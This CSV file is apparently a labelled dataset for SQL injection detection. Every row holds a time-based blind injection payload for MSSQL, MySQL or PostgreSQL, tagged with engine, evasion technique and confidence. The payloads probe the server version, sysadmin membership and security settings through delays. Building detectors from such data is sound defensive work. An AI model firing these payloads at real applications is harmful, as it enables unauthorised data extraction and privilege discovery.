payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"'; if not ( substring ( ( select @@version ) ,25,1 ) <> 0 ) waitfor delay '0:0:2' --",time_blind,mssql,case_variation,0.51,rule,sqliv5_csv,string_single_quote
"'; if not ( substring ( ( select @@version ) ,25,1 ) <> 5 ) waitfor delay '0:0:2' --",time_blind,mssql,case_variation,0.51,rule,sqliv5_csv,string_single_quote
"'; if not ( substring ( ( select @@version ) ,25,1 ) <> 8 ) waitfor delay '0:0:2' --",time_blind,mssql,case_variation,0.51,rule,sqliv5_csv,string_single_quote
"'; if not ( substring ( ( select @@version ) ,24,1 ) <> 1 ) waitfor delay '0:0:2' --",time_blind,mssql,case_variation,0.51,rule,sqliv5_csv,string_single_quote
'; if not ( select system_user ) <> 'sa' waitfor delay '0:0:2' --,time_blind,mssql,case_variation,0.46,rule,sqliv5_csv,string_single_quote
'; if is_srvrolemember ( 'sysadmin' ) > 0 waitfor delay '0:0:2' --,time_blind,mssql,,0.46,rule,sqliv5_csv,string_single_quote
'; if not ( ( select serverproperty ( 'isintegratedsecurityonly' ) ) <> 1 ) waitfor delay '0:0:2' --,time_blind,mssql,case_variation,0.46,rule,sqliv5_csv,string_single_quote
'; if not ( ( select serverproperty ( 'isintegratedsecurityonly' ) ) <> 0 ) waitfor delay '0:0:2' --,time_blind,mssql,case_variation,0.46,rule,sqliv5_csv,string_single_quote
a' waitfor delay '0:0:10'--,time_blind,mssql,,0.46,rule,sqliv5_csv,string_single_quote
1 waitfor delay '0:0:10'--,time_blind,mssql,,0.46,rule,sqliv5_csv,string_single_quote
"benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
""";waitfor delay '0:0:5'--",time_blind,mssql,,0.46,rule,sqliv5_csv,string_single_quote
1 ) or pg_sleep ( 5 ) --,time_blind,postgresql,,0.46,rule,sqliv5_csv,unknown
""" or sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
